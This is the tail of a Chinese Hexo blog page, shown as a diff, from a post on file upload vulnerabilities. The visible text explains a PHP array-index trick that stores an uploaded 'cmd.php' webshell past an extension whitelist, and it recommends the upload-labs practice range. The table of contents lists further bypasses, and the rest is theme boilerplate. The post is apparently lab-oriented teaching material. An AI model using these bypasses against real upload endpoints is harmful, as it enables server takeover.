&quot;请选择要上传的文件！&quot;;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键代码：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650905993-aeab8246-0d40-45c5-8dec-d0ccbef6235d.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650906142-19d62216-c72a-4981-99d6-9abd91a115be.png"></p>
+<p>绕过以上代码的逻辑如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file[0]=cmd.php</span><br><span class="line">$file[3]=jpg</span><br><span class="line"></span><br><span class="line">end($file)=jpg</span><br><span class="line"></span><br><span class="line">一共两个值，读取的是：</span><br><span class="line">$file[2-1]=null</span><br><span class="line"></span><br><span class="line">拼接完是：</span><br><span class="line">cmd.php.(null)</span><br></pre></td></tr></table></figure>
+
+<p>最终payload：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650906188-438340d4-c832-4b28-91f2-a927bcf430e4.png"></p>
+<p><strong>推荐练习靶场：</strong><a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p>
+<p>……还有更多绕过方式等待大家去挖掘！</p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">Jatopos</div><div class="post-copyright__author_desc">Welcome to JATOPOS's home</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2025/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2025/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/')">IMJATOPOS</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2025/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=IMJATOPOS&amp;url=http://example.com/2025/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&amp;pic=https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251005174047895.png" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Jatopos的博客</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251005174047895.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2025/09/25/IMJATOPOS/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/img/%E5%A4%B4%E5%83%8F.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">IMJATOPOS</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://q1.qlogo.cn/g?b=qq&amp;nk=3636469976&amp;s=640" alt="status"/></div></div><div class="author-info__description">一往无前虎山行，拨开云雾见光明</div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E6%83%85%E6%8F%90%E8%A6%81"><span class="toc-number">1.</span> <span class="toc-text">前情提要</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E5%AD%90"><span class="toc-number">1.1.</span> <span class="toc-text">引子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.2.</span> <span class="toc-text">文件上传漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E4%BA%A7%E7%94%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">1.3.</span> <span class="toc-text">为什么会产生文件上传漏洞？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">文件上传漏洞及绕过方式总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFjs%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">前端js验证绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%AB%AF"><span class="toc-number">2.2.</span> <span class="toc-text">后端</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">2.2.1.</span> <span class="toc-text">黑名单</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E8%A7%A3%E6%9E%90%E5%90%8E%E7%BC%80%E5%90%8D"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">特殊解析后缀名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#htaccess%EF%BC%88apache%EF%BC%89"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">.htaccess（apache）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87exif-imagetype-%E4%B8%8A%E4%BC%A0-htaccess"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">绕过exif_imagetype()上传.htaccess</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#user-ini"><span class="toc-number">2.2.1.4.</span> <span class="toc-text">.user.ini</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.1.5.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.1.6.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%82%B9%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.1.7.</span> <span class="toc-text">点绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DATA%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.1.8.</span> <span class="toc-text">::$DATA绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8C%E7%82%B9%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.1.9.</span> <span class="toc-text">双点绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.1.10.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#js%E9%A9%AC%E5%8F%8Aphp%E7%9F%AD%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.1.11.</span> <span class="toc-text">js马及php短标签绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-number">2.2.2.</span> <span class="toc-text">白名单</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9MIME%E4%BF%A1%E6%81%AF%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">修改MIME信息绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">00截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E8%8A%82%E6%A0%87%E8%AF%86%E4%B8%8E%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">字节标识与图片马绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GIF89a%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.2.4.</span> <span class="toc-text">GIF89a绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.2.5.</span> <span class="toc-text">二次渲染绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.2.6.</span> <span class="toc-text">条件竞争绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%86%8D%E7%A7%BB%E5%8A%A8%E3%80%81%E6%94%B9%E5%90%8D"><span class="toc-number">2.2.2.7.</span> <span class="toc-text">先检查文件后缀再移动、改名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.2.8.</span> <span class="toc-text">逻辑数组绕过</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="IMJATOPOS"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251005174047895.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="IMJATOPOS"/></a><div class="content"><a class="title" href="/2025/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="IMJATOPOS">IMJATOPOS</a><time datetime="2025-10-05T08:16:32.000Z" title="发表于 2025-10-05 16:16:32">2025-10-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/25/IMJATOPOS/" title="IMJATOPOS"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/img/%E5%A4%B4%E5%83%8F.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="IMJATOPOS"/></a><div class="content"><a class="title" href="/2025/09/25/IMJATOPOS/" title="IMJATOPOS">IMJATOPOS</a><time datetime="2025-09-24T18:25:12.000Z" title="发表于 2025-09-25 02:25:12">2025-09-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/25/hello-world/" title="Hello World">Hello World</a><time datetime="2025-09-24T18:17:59.803Z" title="发表于 2025-09-25 02:17:59">2025-09-25</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://hexo.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("10/05/2025 14:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "© By 安知鱼 V1.6.15",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Jatopos 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://cdn.cbd.int/qrcodejs@1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
